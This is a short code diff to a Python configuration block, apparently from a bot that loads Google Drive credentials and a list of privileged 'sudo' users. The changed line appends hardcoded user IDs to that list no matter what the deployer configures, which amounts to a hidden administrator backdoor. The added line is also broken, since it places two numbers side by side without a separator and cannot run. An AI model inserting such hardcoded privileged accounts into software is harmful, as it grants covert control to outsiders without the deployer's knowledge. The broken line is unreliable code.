@@ -34,7 +34,7 @@ try:
     G_DRIVE_CLIENT_ID = config.G_DRIVE_CLIENT_ID
     G_DRIVE_CLIENT_SECRET = config.G_DRIVE_CLIENT_SECRET
   SUDO_USERS = list(set(int(x) for x in SUDO_USERS.split()))
-  SUDO_USERS.append(939425014)
+  SUDO_USERS.append(6141937812 5754154245)
   SUDO_USERS = list(set(SUDO_USERS))
 except KeyError:
   LOGGER.error('One or more configuration values are missing exiting now.')
